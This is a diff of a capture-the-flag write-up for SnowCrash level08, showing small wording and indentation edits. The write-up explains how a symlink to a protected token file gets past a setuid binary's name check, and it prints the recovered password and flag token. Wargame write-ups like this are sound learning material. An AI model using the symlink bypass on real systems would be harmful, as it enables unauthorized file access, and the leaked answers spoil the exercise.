@@ -21,20 +21,20 @@ We haven't got any permission on `token` as user `level08`. However, the binary 
     level08@SnowCrash:~$ ./level08 /tmp/test
     test
 ```
-This means the script opens, reads and writes the content of any file, even though it pertains to user `level08`. Obviously, we can't modify the permission rights of `token` with `chmod`, so we need to find a way around this constraint. This can be achieved using symbolic links and absolute paths.
+This means the script opens, reads and writes the content of any file, even though it pertains to user `level08`. Obviously, we can't modify the permission rights of `token` with `chmod`, so we need to find a way around this constraint. This can be achieved through symbolic links and absolute paths.
 
 ```
-  level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/key
-  level08@SnowCrash:~$ cat /tmp/key
+    level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/key
+    level08@SnowCrash:~$ cat /tmp/key
     cat: /tmp/key: Permission denied
-  level08@SnowCrash:~$ ls -la /tmp/key
-  lrwxrwxrwx 1 level08 level08 24 Dec 10 16:48 /tmp/key -> /home/user/level08/token
-  level08@SnowCrash:~$ ./level08 /tmp/key
-  quif5eloekouj29ke0vouxean
-  level08@SnowCrash:~$ su flag08
-  Password:
-  Don't forget to launch getflag !
-  flag08@SnowCrash:~$ getflag
-  Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+    level08@SnowCrash:~$ ls -la /tmp/key
+    lrwxrwxrwx 1 level08 level08 24 Dec 10 16:48 /tmp/key -> /home/user/level08/token
+    level08@SnowCrash:~$ ./level08 /tmp/key
+    quif5eloekouj29ke0vouxean
+    level08@SnowCrash:~$ su flag08
+    Password:
+    Don't forget to launch getflag !
+    flag08@SnowCrash:~$ getflag
+    Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
 ```
-This trick turns out to be very useful for the next couple of levels...
+This trick will turn out to be very useful for the next couple of levels...
